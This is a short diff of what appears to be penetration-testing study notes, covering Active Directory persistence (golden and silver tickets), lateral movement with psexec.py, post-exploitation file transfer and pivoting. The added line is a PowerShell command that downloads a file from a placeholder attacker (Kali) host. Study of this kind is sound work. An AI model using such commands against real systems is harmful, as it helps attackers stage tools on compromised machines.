@@ -277,11 +277,11 @@
 		- with psexec.py \\computer name cmd.exe
 		- goldenticket = persistence
 		- also look like silver ticket
-		- 
 
 - Post Exploitation(need to add the commands to each bullet point)
 	 - File Transfer Review
 		- Powershell download
+			- iwr -uri http://<kali ip address>/fileName -Outfile Filename
 		- certutil
 	- Pivoting(need to add notes for each pivot tool)
 		- chisel
